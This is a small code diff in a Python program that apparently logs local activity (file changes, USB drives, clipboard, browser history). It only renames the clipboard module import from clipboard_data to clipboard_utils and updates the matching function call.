@@ -2,7 +2,7 @@ from watchdog.observers import Observer
 import service.my_handler
 import service.db_utils
 import service.usb_utils
-import service.clipboard_data
+import service.clipboard_utils
 import browserhistory as bh
 
 def main():
@@ -21,7 +21,7 @@ def main():
     while True:
         service.usb_utils.check_all_drives()
         try:
-            service.clipboard_data.get_data_from_clipboard()
+            service.clipboard_utils.get_data_from_clipboard()
         except KeyboardInterrupt:
             bh.write_browserhistory_csv()
             observer.stop()
